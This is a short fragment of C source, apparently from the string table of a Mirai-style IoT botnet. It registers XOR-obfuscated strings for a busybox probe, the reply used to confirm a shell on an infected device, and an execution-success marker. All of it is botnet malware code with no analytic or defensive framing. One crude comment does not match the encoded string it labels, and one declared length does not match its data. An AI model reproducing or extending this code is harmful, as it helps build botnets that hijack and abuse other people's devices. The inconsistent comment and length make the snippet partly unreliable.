...
void table_init(void)
{
    ...
    add_entry(XOR_SCAN_QUERY, "\xDA\x97\x9C\x9B\xDA\x97\x80\x86\x8C\x97\x9A\x8D\xD5\xBE\xAC\xA1\xBA\xBB\xF5", 19); // /bin/busybox Switchblades
    add_entry(XOR_SCAN_RESP, "\xBE\xAC\xA1\xBA\xBB\xCF\xD5\x94\x85\x85\x99\x90\x81\xD5\x9B\x9A\x81\xD5\x93\x9A\x80\x9B\x91\xF5", 24); // Switchblades: applet not found
    ...
    // Misc 
    add_entry(XOR_EXEC_SUCCESS, "\xBC\x9B\x93\x90\x96\x81\x90\x91\xB7\x8C\xB9\x94\x8C\x90\x87\xF5", 8); //rape is not good
